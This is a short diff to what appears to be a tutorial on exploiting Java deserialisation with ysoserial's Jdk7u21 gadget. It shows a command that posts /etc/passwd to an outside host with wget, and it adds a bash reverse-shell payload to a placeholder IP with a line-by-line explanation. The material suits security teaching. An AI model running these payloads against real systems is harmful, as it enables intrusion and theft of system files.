@@ -215,11 +215,14 @@ java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "wget --post-file /etc/passwd  h
 
 Step 1: Send the vulnerable request to **DS - Exploitation Tab**
 
-Step 2: Using the following command to gain a **Reverse Shell**.
+Step 2: Use the following Bash Reverse Shell command to gain a **Reverse Shell**.
 
 ```bash
 Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
 ```
+* bash -i >& - Invokes bash with an **“interactive”** option.
+* /dev/tcp/ipaddress/1337 - Redirects that session to a tcp socket via device file. 
+* 0>&1 - Takes standard output, and connects it to standard input.
 
 <p align="center">
   <img src="/images/deserialisation/desc24.png">
